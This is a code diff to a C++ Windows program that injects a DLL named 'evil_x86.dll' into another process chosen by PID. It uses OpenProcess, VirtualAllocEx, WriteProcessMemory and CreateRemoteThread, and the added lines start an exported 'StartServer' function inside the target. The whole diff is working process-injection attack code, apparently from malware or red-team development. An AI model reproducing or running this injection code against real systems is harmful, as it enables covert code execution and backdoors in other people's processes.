@@ -8,11 +8,9 @@ char evilDLL[] = "C:\\evil_x86.dll";
 unsigned int evilLen = sizeof(evilDLL) + 1;
 
 int main(int argc, char* argv[]) {
-  HANDLE ph; // process handle
-  HANDLE rt; // remote thread
-  LPVOID rb; // remote buffer
-
-  LoadLibraryA("evil_x86.dll");
+  HANDLE target_process; // process handle
+  HANDLE remote_thread; // remote thread
+  LPVOID remote_buffer; // remote buffer
 
   // handle to kernel32 and pass it to GetProcAddress
   HMODULE hKernel32 = GetModuleHandleA("Kernel32");
@@ -31,30 +29,37 @@ int main(int argc, char* argv[]) {
       printf("PID not found :( exiting...\n");
       return -1;
   }
-  printf("PID: %i", atoi(argv[1]));
-  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
-  if (ph == NULL) {
+  printf("PID: %i\n", atoi(argv[1]));
+  target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+  if (target_process == NULL) {
     printf(" [x] Error while opening the process\n");
-  } else printf("[i] Process opened\n");
+  } else printf("[i] Process opened with full access\n");
 
   // allocate memory buffer for remote process
-  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-  if (rb == NULL) {
+  remote_buffer = VirtualAllocEx(target_process, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+  if (remote_buffer == NULL) {
     printf(" [x] Error while allocating space in the process\n");
   } else printf(" [i] Successfully allocated memory in the target process\n");
 
   // "copy" evil DLL between processes
-  BOOL res = WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+  BOOL res = WriteProcessMemory(target_process, remote_buffer, evilDLL, evilLen, NULL);
   if (res == NULL) {
     printf(" [x] Error while writing memory to the target process\n");
   } else printf(" [i] DLL path copied to the target process\n");
 
   // our process start new thread
-  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
-  if (rt == NULL) {
+  remote_thread = CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE)lb, remote_buffer, 0, NULL);
+  if (remote_thread == NULL) {
     printf(" [x] Error creating thread in target process. Windows error: %s\n", error_handling::GetLastErrorAsString().c_str());
   } else printf(" [i] Created thread in target process\n");
   
-  CloseHandle(ph);
+  HMODULE evil_dll = LoadLibraryA(evilDLL);
+  if (evil_dll != NULL) {
+    printf(" [i] Loaded DLL in current process\n");
+    FARPROC start_server_func = GetProcAddress(evil_dll, "StartServer");
+    CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE) start_server_func, NULL, 0, NULL);
+  } else printf("[x] Error loading custom DLL");
+  
+  CloseHandle(target_process);
   return 0;
 }
